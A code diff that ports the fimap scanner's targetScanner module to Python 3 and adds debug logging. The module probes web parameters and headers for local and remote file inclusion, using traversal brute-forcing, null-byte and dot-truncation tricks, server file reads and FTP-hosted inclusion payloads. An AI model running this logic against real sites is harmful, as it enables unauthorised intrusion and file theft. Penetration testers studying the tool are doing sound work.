@@ -18,12 +18,9 @@
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 #
 
-from config import settings
 from copy import copy, deepcopy
 import pickle
 import shutil
-import baseClass
-from report import report
 import re,os
 import os.path
 import posixpath
@@ -31,26 +28,32 @@ import ntpath
 import difflib
 import time
 
+import baseClass
+from config import settings
+from report import report
+
+
 __author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
 __date__ ="$30.08.2009 19:59:44$"
 
-class targetScanner (baseClass.baseClass):
+
+class targetScanner(baseClass.baseClass):
 
     def _load(self):
         self.MonkeyTechnique = False
-        self._log("TargetScanner loaded.", self.LOG_DEVEL)
+        self._log("TargetScanner loaded.", self.LOG_DEBUG)
         self.params = {}
         self.postparams = {}
         self.header = {}
 
     def prepareTarget(self, url):
         self.Target_URL = url
-
-        self._log("Inspecting URL '%s'..."%(self.Target_URL), self.LOG_ALWAYS)
-        self._log("Analyzing provided GET params...", self.LOG_DEBUG);
+        self._log("[*] Inspecting URL: '%s'..." % (self.Target_URL), self.LOG_ALWAYS)
+        self._log("Checking if user provided GET params...", self.LOG_DEBUG)
         if (self.Target_URL.count("?") == 0):
-            self._log("Target URL doesn't have any GET params.", self.LOG_DEBUG);
+            self._log("Target URL doesn't have any GET params.", self.LOG_DEBUG)
         else:
+            self._log("Analyzing provided GET params...", self.LOG_DEBUG)
             data = self.Target_URL.split("?")[1]
             if (data.find("&") == -1):
                 self.__addToken(self.params, data)
@@ -58,21 +61,23 @@ class targetScanner (baseClass.baseClass):
                 for ln in data.split("&"):
                     self.__addToken(self.params, ln)
 
-        self._log("Analyzing provided POST params...", self.LOG_DEBUG);
+        self._log("Checking if user provided POST params...", self.LOG_DEBUG)
         post = self.config["p_post"]
         if (post != ""):
+            self._log("Analyzing provided POST params...", self.LOG_DEBUG)
             if (post.find("&") == -1):
                 self.__addToken(self.postparams, post)
             else:
                 for ln in post.split("&"):
                     self.__addToken(self.postparams, ln)
         else:
-            self._log("No POST params provided.", self.LOG_DEBUG);
-            
-        self._log("Analyzing provided headers...", self.LOG_DEBUG);
+            self._log("No POST params provided.", self.LOG_DEBUG)
+
+        self._log("Checking if user provided headers...", self.LOG_DEBUG)
         header = self.config["header"]
         if (len(header) > 0):
-            for key, headerString in header.items():
+            self._log("Analyzing provided headers...", self.LOG_DEBUG)
+            for key, headerString in list(header.items()):
                 self.header[key] = {}
                 if (headerString.find(";") == -1):
                     self.__addToken(self.header[key], headerString)
@@ -80,7 +85,7 @@ class targetScanner (baseClass.baseClass):
                     for ln in headerString.split(";"):
                         self.__addToken(self.header[key], ln)
         else:
-            self._log("No headers provided.", self.LOG_DEBUG);
+            self._log("No headers provided.", self.LOG_DEBUG)
 
         return(len(self.params)>0 or len(self.postparams)>0 or len(self.header)>0)
 
@@ -88,7 +93,7 @@ class targetScanner (baseClass.baseClass):
         tmpurl = self.Target_URL
         tmppost = post
         headDict = header
-        
+
         rndStr = self.getRandomStr()
         if (haxMode == 0):
             tmpurl = tmpurl.replace("%s=%s"%(k,v), "%s=%s"%(k, rndStr))
@@ -98,36 +103,39 @@ class targetScanner (baseClass.baseClass):
             tmphead = headDict[headerKey]
             tmphead = tmphead.replace("%s=%s"%(k,v), "%s=%s"%(k, rndStr))
             headDict[headerKey] = tmphead
-        
+
         code = None
         if (post==None):
             self._log("Requesting: '%s'..." %(tmpurl), self.LOG_DEBUG)
             code = self.doGetRequest(tmpurl, additionalHeaders=headDict)
         else:
-            self._log("Requesting: '%s' with POST('%s')..." %(tmpurl, tmppost), self.LOG_DEBUG)
+            self._log("Requesting: '%s' with POST ('%s')..." % (tmpurl, tmppost), self.LOG_DEBUG)
             code = self.doPostRequest(tmpurl, tmppost, additionalHeaders=headDict)
 
         if (len(headDict)>0):
-            for ck,vv in headDict.items():
+            for ck,vv in list(headDict.items()):
                 self._log("  Header: '%s' -> %s"%(ck, vv), self.LOG_DEBUG)
 
         xml2config = self.config["XML2CONFIG"]
         READFILE_ERR_MSG = xml2config.getAllReadfileRegex()
 
         if (code != None):
+            self._log("code response is not empty during target analysis", self.LOG_DEBUG)
+            self._log("code analysis :: code: {}".format(code), self.LOG_DEBUG)
             disclosure_found = False
             for lang, ex in READFILE_ERR_MSG:
                 RE_SUCCESS_MSG = re.compile(ex%(rndStr), re.DOTALL)
                 m = RE_SUCCESS_MSG.search(code)
+                self._log("code analysis :: m: {}".format(m), self.LOG_DEBUG)
                 if (m != None):
                     if (haxMode == 0):
-                        self._log("Possible local file disclosure found! -> '%s' with Parameter '%s'. (%s)"%(tmpurl, k, lang), self.LOG_ALWAYS)
+                        self._log("Possible local file disclosure found! -> '%s' with Parameter '%s'. (%s)" % (tmpurl, k, lang), self.LOG_ALWAYS)
                     elif (haxMode == 1):
-                        self._log("Possible local file disclosure found! -> '%s' with POST-Parameter '%s'. (%s)"%(tmpurl, k, lang), self.LOG_ALWAYS)
+                        self._log("Possible local file disclosure found! -> '%s' with POST-Parameter '%s'. (%s)" % (tmpurl, k, lang), self.LOG_ALWAYS)
                     elif (haxMode == 2):
-                        self._log("Possible local file disclosure found! -> '%s' with Header(%s)-Parameter '%s'. (%s)"%(tmpurl, k, headerKey, lang), self.LOG_ALWAYS)
+                        self._log("Possible local file disclosure found! -> '%s' with Header(%s)-Parameter '%s'. (%s)" % (tmpurl, k, headerKey, lang), self.LOG_ALWAYS)
                     #self.identifyReadFile(URL, Params, VulnParam)
-                    self._writeToLog("READ ; %s ; %s"%(tmpurl, k))
+                    self._writeToLog("READ ; %s ; %s" % (tmpurl, k))
                     disclosure_found = True
                     break
 
@@ -148,7 +156,7 @@ class targetScanner (baseClass.baseClass):
                         elif (haxMode == 2):
                             self._log("[%s] Possible file inclusion found! -> '%s' with Header(%s)-Parameter '%s'." %(lang, tmpurl, headerKey, k), self.LOG_ALWAYS)
                             rep = self.identifyVuln(self.Target_URL, self.header, k, post, lang, haxMode, None, None, headerKey, headerDict = headDict)
-                        
+
                         if (rep != None):
                             rep.setVulnKeyVal(v)
                             rep.setLanguage(lang)
@@ -161,7 +169,7 @@ class targetScanner (baseClass.baseClass):
         rep = None
         doBreak = False
         headDict = deepcopy(header)
-        
+
         if (haxMode == 0):
             tmpurl = tmpurl.replace("%s=%s"%(k,v), "%s=%s"%(k, testfile))
         elif (haxMode == 1):
@@ -170,27 +178,27 @@ class targetScanner (baseClass.baseClass):
             tmphead = headDict[headerKey]
             tmphead = tmphead.replace("%s=%s"%(k,v), "%s=%s"%(k, testfile))
             headDict[headerKey] = tmphead
-            
+
         if (post != None and post != ""):
             self._log("Requesting: '%s'..." %(tmpurl), self.LOG_DEBUG)
         else:
             self._log("Requesting: '%s' with POST('%s')..." %(tmpurl, tmppost), self.LOG_DEBUG)
-        
+
         code = self.doPostRequest(tmpurl, tmppost, additionalHeaders=headDict)
         if (code != None):
             if (code.find(find) != -1):
                 if (haxMode == 0):
                     self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                     rep = self.identifyVuln(self.Target_URL, self.params, k, post, None, haxMode, (goBackSymbols * i, False), isUnix, headerDict = headDict)
-                    
+
                 elif (haxMode == 1):
                     self._log("Possible file inclusion found blindly! -> '%s' with POST-Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                     rep = self.identifyVuln(self.Target_URL, self.postparams, k, post, None, haxMode, (goBackSymbols * i, False), isUnix, headerDict = headDict)
-                    
+
                 elif (haxMode == 2):
                     self._log("Possible file inclusion found blindly! -> '%s' with Header(%s)-Parameter '%s'." %(tmpurl, headerKey, k), self.LOG_ALWAYS)
                     rep = self.identifyVuln(self.Target_URL, self.header, k, post, None, haxMode, (goBackSymbols * i, False), isUnix, headerKey, headerDict = headDict)
-                
+
                 doBreak = True
 
             else:
@@ -206,21 +214,20 @@ class targetScanner (baseClass.baseClass):
                     tmphead = headDict[headerKey]
                     tmphead = tmphead.replace("%s=%s"%(k,v), "%s=%s"%(k, tmpfile))
                     headDict[headerKey] = tmphead
-                
+
                 if (post != None and post != ""):
                     self._log("Requesting: '%s'..." %(tmpurl), self.LOG_DEBUG)
                 else:
                     self._log("Requesting: '%s' with POST('%s')..." %(tmpurl, postdata), self.LOG_DEBUG)
-                
+
                 code = self.doPostRequest(tmpurl, postdata, additionalHeaders=headDict)
-                
+
                 if (code == None):
                     self._log("Code == None. Skipping testing of the URL.", self.LOG_DEBUG)
-	            if (self.config["p_skiponerror"] == True): # User decided to skip blind check if server returned an error.
-			self._log("You decided to cancel blind checks when the server returned an error.", self.LOG_ALWAYS)
-                	self._log("Code == None. Skipping testing of the URL.", self.LOG_DEBUG)
-
-                    	doBreak = True
+                if (self.config["p_skiponerror"] == True): # User decided to skip blind check if server returned an error.
+                    self._log("You decided to cancel blind checks when the server returned an error.", self.LOG_ALWAYS)
+                    self._log("Code == None. Skipping testing of the URL.", self.LOG_DEBUG)
+                    doBreak = True
                 else:
                     if (code.find(find) != -1):
                         if (haxMode == 0):
@@ -233,7 +240,7 @@ class targetScanner (baseClass.baseClass):
                             self._log("Possible file inclusion found blindly! -> '%s' with Header(%s)-Parameter '%s'." %(tmpurl, headerKey, k), self.LOG_ALWAYS)
                             doBreak = True
                         rep = self.identifyVuln(self.Target_URL, self.params, k, post, None, haxMode, (goBackSymbols * i, True), isUnix, headerKey, headerDict = headDict)
-                        
+
         else:
             # Previous result was none. Assuming that we can break here.
             doBreak = True
@@ -241,54 +248,54 @@ class targetScanner (baseClass.baseClass):
 
     def testTargetVuln(self):
         ret = []
-
         xml2config = self.config["XML2CONFIG"]
-
-        self._log("Fiddling around with URL...", self.LOG_INFO)
+        self._log("testTargetVuln :: Begin - testing URL...", self.LOG_DEBUG)
 
         # Scan Get
-        for k,v in self.params.items():
+        for k,v in list(self.params.items()):
+            self._log("testTargetVuln :: GET params - k: {}, v: {}, p_post: {}".format(k, v, self.config["p_post"]), self.LOG_DEBUG)
             self.analyzeURL(ret, k, v, self.config["p_post"], 0, self.config["header"])
         # Scan Post
-        for k,v in self.postparams.items():
+        for k,v in list(self.postparams.items()):
+            self._log("testTargetVuln :: POST params - k: {}, v: {}, p_post: {}".format(k, v, self.config["p_post"]), self.LOG_DEBUG)
             self.analyzeURL(ret, k, v, self.config["p_post"], 1, self.config["header"])
         # Scan Headers
-        for key,params in self.header.items():
-            for k,v in params.items():
+        for key,params in list(self.header.items()):
+            for k,v in list(params.items()):
+                self._log("testTargetVuln :: HEADER params - k: {}, v: {}, p_post: {}".format(k, v, self.config["p_post"]), self.LOG_DEBUG)
                 self.analyzeURL(ret, k, v, self.config["p_post"], 2, deepcopy(self.config["header"]), key)
-                
 
         if (len(ret) == 0 and self.MonkeyTechnique):
             self._log("Sniper failed. Going blind...", self.LOG_INFO)
             files = xml2config.getBlindFiles()
-            
+
             os_restriction = self.config["force-os"]
-            
+
             for fileobj in files:
                 post = fileobj.getPostData()
                 v    = fileobj.getFindStr()
                 f    = fileobj.getFilepath()
-                
+
                 if (os_restriction != None):
                     if (fileobj.isWindows() and os_restriction != "windows"):
                         continue
-                    
+
                     if (fileobj.isUnix() and os_restriction != "linux"):
                         continue
-                
+
                 backSyms = (fileobj.getBackSymbols(), fileobj.getBackSymbols(False))
-                
+
                 get_done  = False
                 post_done = False
                 head_done = {}
-                
+
                 for backSym in backSyms:
                     # URL Special Char Multiplier
                     if (self.config["p_multiply_term"] > 1):
                         multi = self.config["p_multiply_term"]
                         backSym  = backSym.replace("..", ".." * multi)
                         backSym  = backSym.replace(fileobj.getBackSymbol(), fileobj.getBackSymbol() * multi)
-                        
+
                     for i in range(xml2config.getBlindMin(), xml2config.getBlindMax()):
                         doBreak = False
                         testfile = f
@@ -297,10 +304,10 @@ class targetScanner (baseClass.baseClass):
                             if (fileobj.isWindows()):
                                 tmpf = f[f.find(":")+1:]
                             testfile = backSym * i + tmpf
-                        
+
                         rep = None
                         if not get_done:
-                            for k,V in self.params.items():
+                            for k,V in list(self.params.items()):
                                 rep, doBreak = self.analyzeURLblindly(i, testfile, k, V, v, backSym, self.config["p_post"], 0, fileobj.isUnix(), deepcopy(self.config["header"]))
                                 if (rep != None):
                                     rep.setVulnKeyVal(V)
@@ -309,9 +316,9 @@ class targetScanner (baseClass.baseClass):
                                     rep.setHeader(deepcopy(self.config["header"]))
                                     ret.append((rep, self.readFiles(rep)))
                                     get_done = True
-                        
+
                         if not post_done:
-                            for k,V in self.postparams.items():
+                            for k,V in list(self.postparams.items()):
                                 rep, doBreak = self.analyzeURLblindly(i, testfile, k, V, v, backSym, self.config["p_post"], 1, fileobj.isUnix(), deepcopy(self.config["header"]))
                                 if (rep != None):
                                     rep.setVulnKeyVal(V)
@@ -320,14 +327,14 @@ class targetScanner (baseClass.baseClass):
                                     rep.setHeader(deepcopy(self.config["header"]))
                                     ret.append((rep, self.readFiles(rep)))
                                     post_done = True
-                        
-                    
-                        for key,params in self.header.items():
-                            if (not head_done.has_key(key)):
+
+
+                        for key,params in list(self.header.items()):
+                            if (key not in head_done):
                                 head_done[key] = False
-                            
+
                             if (not head_done[key]):
-                                for k,val in params.items():
+                                for k,val in list(params.items()):
                                     rep, doBreak = self.analyzeURLblindly(i, testfile, k, val, v, backSym, self.config["p_post"], 2, fileobj.isUnix(), deepcopy(self.config["header"]), key)
                                     if (rep != None):
                                         rep.setVulnKeyVal(val)
@@ -338,30 +345,29 @@ class targetScanner (baseClass.baseClass):
                                         ret.append((rep, self.readFiles(rep)))
                                         head_done[key] = True
 
-                        if (doBreak): 
+                        if (doBreak):
                             return(ret) # <-- Return if we found one blindly readable file.
-                          
+
                         # When this is a remote file inclusion test done blindly, we do not want to bruteforce
                         # subdirectories with ../../http://www.... nonsense.
                         if ("R" in fileobj.getFlags()):
                             break
-                            
-                    
-        return(ret)
 
+
+        return(ret)
 
 
     def identifyVuln(self, URL, Params, VulnParam, PostData, Language, haxMode=0, blindmode=None, isUnix=None, headerKey=None, headerDict=None):
         xml2config = self.config["XML2CONFIG"]
-        
+
         if (blindmode == None):
             r = report(URL, Params, VulnParam)
             script = None
             scriptpath = None
             pre = None
-            
+
             langClass = xml2config.getAllLangSets()[Language]
-            
+
             if (haxMode == 0):
                 self._log("[%s] Identifying Vulnerability '%s' with Parameter '%s'..."%(Language, URL, VulnParam), self.LOG_ALWAYS)
             elif (haxMode == 1):
@@ -389,18 +395,18 @@ class targetScanner (baseClass.baseClass):
             if (code == None):
                 self._log("Identification of vulnerability failed. (code == None)", self.LOG_ERROR)
                 return None
-                
+
             m = RE_SUCCESS_MSG.search(code)
             if (m == None):
                 self._log("Identification of vulnerability failed. (m == None)", self.LOG_ERROR)
                 return None
 
 
-            
+
             r.setPost(haxMode)
             r.setPostData(PostData)
             r.setHeader(deepcopy(self.config["header"]))
-            
+
             for sp_err_msg in langClass.getIncludeDetectors():
                 RE_SCRIPT_PATH = re.compile(sp_err_msg, re.S)
                 s = RE_SCRIPT_PATH.search(code)
@@ -408,20 +414,20 @@ class targetScanner (baseClass.baseClass):
             if (s == None):
                 self._log("Failed to retrieve script path.", self.LOG_WARN)
 
-                print "[MINOR BUG FOUND]"
-                print "------------------------------------------------------"
-                print "It's possible that fimap was unable to retrieve the scriptpath"
-                print "because the regex for this kind of error message is missing."
-                a = raw_input("Do you want to help me and send the URL of the site? [y = Print Info/N = Discard]")
+                print("[MINOR BUG FOUND]")
+                print("------------------------------------------------------")
+                print("It's possible that fimap was unable to retrieve the scriptpath")
+                print("because the regex for this kind of error message is missing.")
+                a = input("Do you want to help me and send the URL of the site? [y = Print Info/N = Discard]")
                 if (a=="y" or a=="Y"):
-                    print "-----------SEND THIS TO 'fimap.dev@gmail.com'-----------"
-                    print "SUBJECT: fimap Regex"
-                    print "ERROR  : Failed to retrieve script path."
-                    print "URL    : " + URL
-                    print "-----------------------------------------------------------"
-                    raw_input("Copy it and press enter to proceed with scanning...")
+                    print("-----------SEND THIS TO 'fimap.dev@gmail.com'-----------")
+                    print("SUBJECT: fimap Regex")
+                    print("ERROR  : Failed to retrieve script path.")
+                    print("URL    : " + URL)
+                    print("-----------------------------------------------------------")
+                    input("Copy it and press enter to proceed with scanning...")
                 else:
-                    print "No problem! I'll continue with your scan..."
+                    print("No problem! I'll continue with your scan...")
 
                 return(None)
             else:
@@ -469,7 +475,7 @@ class targetScanner (baseClass.baseClass):
 
 
                 rootdir = None
-                
+
                 if (pre[0] != "/"):
                     if (r.isUnix()):
                         pre = posixpath.join(r.getServerPath(), pre)
@@ -484,17 +490,17 @@ class targetScanner (baseClass.baseClass):
                         elif (pre[0:1] == "\\"):
                             self._log("The inclusion points to a network path! Skipping vulnerability.", self.LOG_WARN)
                             return(None)
-                    
-                        
+
+
                         pre = self.relpath_win(rootdir, pre)
                 else:
                     pre = self.relpath_unix("/", pre)
                 if addSlash: pre = rootdir + pre
-                
+
                 #Quick fix for increasing success :P
                 if (pre != "."):
                     pre = "/" + pre
-                
+
                 sur = tokens[1]
                 if (pre == "."): pre = ""
                 r.setPrefix(pre)
@@ -506,7 +512,7 @@ class targetScanner (baseClass.baseClass):
                     tmpurl = URL
                     PostHax = PostData
                     head = deepcopy(self.config["header"])
-                    
+
                     if (haxMode == 0):
                         tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
                     elif (haxMode == 1):
@@ -516,7 +522,7 @@ class targetScanner (baseClass.baseClass):
                         tmphead = tmphead.replace("%s=%s"%(VulnParam,Params[headerKey][VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
                         head[headerKey] = tmphead
                         r.setVulnHeaderKey(headerKey)
-                        
+
                     code = self.doPostRequest(tmpurl, PostHax, additionalHeaders = head)
                     if (code == None):
                         self._log("NULL-Byte testing failed.", self.LOG_WARN)
@@ -535,11 +541,11 @@ class targetScanner (baseClass.baseClass):
                         self._log("Not trying dot-truncation because it's a unix server and you have not enabled it.", self.LOG_INFO)
                     else:
                         self._log("Trying Dot Truncation to get rid of the suffix...", self.LOG_INFO)
-                        dot_trunc_start = self.config["p_dot_trunc_min"] 
+                        dot_trunc_start = self.config["p_dot_trunc_min"]
                         dot_trunc_end   = self.config["p_dot_trunc_max"]
                         dot_trunc_step  = self.config["p_dot_trunc_step"]
                         max_diff        = self.config["p_dot_trunc_ratio"]
-    
+
                         self._log("Preparing Dot Truncation...", self.LOG_DEBUG)
                         self._log("Start: %d"%(dot_trunc_start), self.LOG_DEVEL)
                         self._log("Stop : %d"%(dot_trunc_end), self.LOG_DEVEL)
@@ -547,18 +553,18 @@ class targetScanner (baseClass.baseClass):
                         self._log("Ratio: %f"%(max_diff), self.LOG_DEVEL)
                         desturl = URL
                         PostHax = PostData
-                        
+
                         head = deepcopy(self.config["header"])
-                        
+
                         code1 = self.doPostRequest(URL, PostData, additionalHeaders=head)
-       
+
                         vulnParamBlock = None
-                        
+
                         if (haxMode in (0,1)):
                             vulnParamBlock = "%s=%s%s"%(VulnParam, Params[VulnParam], r.getAppendix())
                         else:
                             vulnParamBlock = "%s=%s%s"%(VulnParam, Params[headerKey][VulnParam], r.getAppendix())
-                        
+
                         if (haxMode == 0):
                             desturl = desturl.replace("%s=%s"%(VulnParam,Params[VulnParam]), vulnParamBlock)
                         elif (haxMode == 1):
@@ -568,13 +574,13 @@ class targetScanner (baseClass.baseClass):
                             tmphead = tmphead.replace("%s=%s"%(VulnParam,Params[headerKey][VulnParam]), vulnParamBlock)
                             headerDict[headerKey] = tmphead
                             r.setVulnHeaderKey(headerKey)
-                        
+
                         self._log("Test URL will be: " + desturl, self.LOG_DEBUG)
-                        
+
                         success = False
-                        
+
                         seqmatcher = difflib.SequenceMatcher()
-                        
+
                         for i in range (dot_trunc_start, dot_trunc_end, dot_trunc_step):
                             tmpurl = desturl
                             tmppost = PostHax
@@ -587,12 +593,12 @@ class targetScanner (baseClass.baseClass):
                                 tmp = tmphead[headerKey]
                                 tmp = tmp.replace(vulnParamBlock, "%s%s"%(vulnParamBlock, "." * i))
                                 tmphead[headerKey] = tmp
-                                
+
                             content = self.doPostRequest(tmpurl, tmppost, additionalHeaders=tmphead)
                             if (content == None):
                                 self._log("Dot Truncation testing failed :(", self.LOG_WARN)
                                 break
-                            
+
                             seqmatcher.set_seqs(code1, content)
                             ratio = seqmatcher.ratio()
                             if (1-max_diff <= ratio <= 1):
@@ -606,7 +612,7 @@ class targetScanner (baseClass.baseClass):
                                 self._log("No luck with (%s)..." %(i), self.LOG_DEBUG)
                         if (not success):
                             self._log("Dot Truncation not possible :(", self.LOG_INFO)
-                        
+
             if (scriptpath == ""):
                 # Failed to get scriptpath with easy method :(
                 if (pre != ""):
@@ -620,8 +626,8 @@ class targetScanner (baseClass.baseClass):
                     r.setServerScript(script)
 
             return(r)
-        
-        
+
+
         else:
             # Blindmode
             prefix = blindmode[0]
@@ -640,13 +646,13 @@ class targetScanner (baseClass.baseClass):
             else:
                 r.setServerPath(prefix.replace("..", "a"))
             r.setServerScript("noop")
-            
+
             slash = ""
             if (isUnix):
                 slash = "/"
             else:
                 slash = "\\"
-            
+
             r.setPrefix(prefix + slash) # <-- Increase success
             if (not isUnix):
                 r.setWindows()
@@ -675,7 +681,7 @@ class targetScanner (baseClass.baseClass):
                 boxarr = []
                 choose = []
                 idx = 0
-                for Name, langClass in xml2config.getAllLangSets().items():
+                for Name, langClass in list(xml2config.getAllLangSets().items()):
                     boxarr.append("[%d] %s"%(idx+1, Name))
                     choose.append(Name)
                     idx += 1
@@ -683,23 +689,23 @@ class targetScanner (baseClass.baseClass):
                 self.drawBox(boxheader, boxarr)
                 inp = ""
                 while (1==1):
-                    inp = raw_input("Script number: ")
+                    inp = input("Script number: ")
                     if (inp == "q" or inp == "Q"):
                         return([])
                     else:
                         try:
                             idx = int(inp)
                             if (idx < 1 or idx > len(choose)):
-                                print "Choose out of range..."
+                                print("Choose out of range...")
                             else:
                                 rep.setLanguage(choose[idx-1])
                                 langClass = xml2config.getAllLangSets()[rep.getLanguage()]
                                 break
                         except:
-                            print "Invalid Number!"
-        
-        
-        
+                            print("Invalid Number!")
+
+
+
         files     = xml2config.getRelativeFiles(rep.getLanguage())
         abs_files = xml2config.getAbsoluteFiles(rep.getLanguage())
         rmt_files = xml2config.getRemoteFiles(rep.getLanguage())
@@ -719,7 +725,7 @@ class targetScanner (baseClass.baseClass):
                 quiz, answer = langClass.generateQuiz()
                 post = post.replace("__QUIZ__", quiz)
                 p = p.replace("__ANSWER__", answer)
-                
+
             if ((rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()))):
                 if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                     if (self.readFile(rep, f, p, POST=post)):
@@ -739,7 +745,7 @@ class targetScanner (baseClass.baseClass):
             f    = fileobj.getFilepath()
             type = fileobj.getFlags()
             canbreak = fileobj.isBreakable()
-            
+
             quiz = answer = None
             if (post != None):
                 quiz, answer = langClass.generateQuiz()
@@ -749,7 +755,7 @@ class targetScanner (baseClass.baseClass):
                 if canbreak:
                     #SUPERDUPER URL HAX!
                     rep.setSurfix("&")
-                
+
                 if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                     if (self.readFile(rep, f, p, True, POST=post)):
                         ret.append(f)
@@ -767,7 +773,7 @@ class targetScanner (baseClass.baseClass):
             p    = fileobj.getFindStr()
             f    = fileobj.getFilepath()
             type = fileobj.getFlags()
-            
+
             if ((rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()))):
                 if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                     if (self.readFile(rep, f, p)):
@@ -776,7 +782,7 @@ class targetScanner (baseClass.baseClass):
                     else:
                         pass
                 else:
-                   self._log("Skipping log file '%s' because it's not suitable for our OS."%f, self.LOG_DEBUG) 
+                   self._log("Skipping log file '%s' because it's not suitable for our OS."%f, self.LOG_DEBUG)
             else:
                 self._log("Skipping log file '%s'."%f, self.LOG_INFO)
 
@@ -788,15 +794,15 @@ class targetScanner (baseClass.baseClass):
                 quiz, answer = langClass.generateQuiz()
                 if (rfi_mode == "ftp"):
                     fl = settings["dynamic_rfi"]["ftp"]["ftp_path"] + rep.getAppendix()
-                    
+
                     up = self.FTPuploadFile(quiz, rep.getSurfix())
                     # Discard the suffix if there is a forced directory structure.
                     if (up["http"].endswith(rep.getAppendix())):
                         rep.setSurfix("")
-                        up["http"] = up["http"][:len(up["http"]) - len(rep.getAppendix())] 
-                    
-                    
-                    
+                        up["http"] = up["http"][:len(up["http"]) - len(rep.getAppendix())]
+
+
+
                 elif(rfi_mode == "local"):
                     up = self.putLocalPayload(quiz, rep.getAppendix())
                     if (not up["http"].endswith(rep.getAppendix())):
@@ -806,12 +812,12 @@ class targetScanner (baseClass.baseClass):
                     rep.setRemoteInjectable(True)
                     self.addXMLLog(rep, "rxR", up["http"])
 
-                if (rfi_mode == "ftp"): 
+                if (rfi_mode == "ftp"):
                     if up["dirstruct"]:
                         self.FTPdeleteDirectory(up["ftp"])
                     else:
                         self.FTPdeleteFile(up["ftp"])
-                if (rfi_mode == "local"): 
+                if (rfi_mode == "local"):
                     self.deleteLocalPayload(up["local"])
         else:
             self._log("Testing remote inclusion...", self.LOG_DEBUG)
@@ -821,7 +827,7 @@ class targetScanner (baseClass.baseClass):
                 f    = fileobj.getFilepath()
                 type = fileobj.getFlags()
                 canbreak = fileobj.isBreakable()
-                
+
                 if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()) or canbreak)):
                     if ((not rep.isSuffixBreakable() and not rep.getSurfix() == "") and f.endswith(rep.getSurfix())):
                         f = f[:-len(rep.getSurfix())]
@@ -829,7 +835,7 @@ class targetScanner (baseClass.baseClass):
                     elif (canbreak):
                         #SUPERDUPER URL HAX!
                         rep.setSurfix("&")
-                    
+
                     if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                         if (self.readFile(rep, f, p, True)):
                             ret.append(f)
@@ -850,25 +856,25 @@ class targetScanner (baseClass.baseClass):
 
     def readFile(self, report, filepath, filepattern, isAbs=False, POST=None, HEADER=None):
         self._log("Testing file '%s'..." %filepath, self.LOG_INFO)
-        
+
         xml2config = self.config["XML2CONFIG"]
         langClass = xml2config.getAllLangSets()[report.getLanguage()]
-        
+
         tmpurl = report.getURL()
         prefix = report.getPrefix()
         surfix = report.getSurfix()
         vuln   = report.getVulnKey()
         params = report.getParams()
         isunix = report.isUnix()
-        
+
         scriptpath = report.getServerPath()
-        
+
         postdata    = report.getPostData()
         header      = deepcopy(report.getHeader())
         vulnHeader  = report.getVulnHeader()
         haxMode = report.isPost
-        
-        
+
+
         filepatha = ""
         if (prefix != None and prefix != "" and prefix[-1] == "/"):
             prefix = prefix[:-1]
@@ -890,8 +896,8 @@ class targetScanner (baseClass.baseClass):
         payload = "%s%s"%(filepatha, surfix)
         if (payload.endswith(report.getAppendix())):
             payload = payload[:len(payload) - len(report.getAppendix())]
-        
-                    
+
+
         if (haxMode == 0):
             tmpurl = tmpurl.replace("%s=%s" %(vuln, params[vuln]), "%s=%s"%(vuln, payload))
         elif (haxMode == 1):
